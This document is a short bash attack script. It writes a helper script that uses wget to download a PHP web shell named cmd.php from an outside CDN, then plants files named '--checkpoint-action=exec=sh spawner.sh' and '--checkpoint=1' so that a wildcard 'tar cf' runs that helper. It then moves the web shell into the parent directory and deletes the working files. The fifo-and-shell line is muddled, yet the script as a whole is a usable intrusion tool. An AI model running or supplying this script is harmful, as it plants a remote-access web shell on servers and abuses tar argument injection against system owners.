#!/bin/bash
mkdir object_files
cd object_files
echo "mkfifo x.php; wget https://rawcdn.githack.com/ortod0x/rootkitninja_webshell/7f5ee310ae7f45318701941610a4939d794a2c5c/cmd.php 0<x.php | /bin/sh >x.php 2>&1; rm x.php" > spawner.sh
echo "" > "--checkpoint-action=exec=sh spawner.sh"
echo "" > --checkpoint=1
tar cf spawn.tar *
find . ! -name 'cmd.php' -type f -exec rm -f {} +
mv cmd.php ../cmd.php
cd ..
rm -rf object_files
echo "Done"
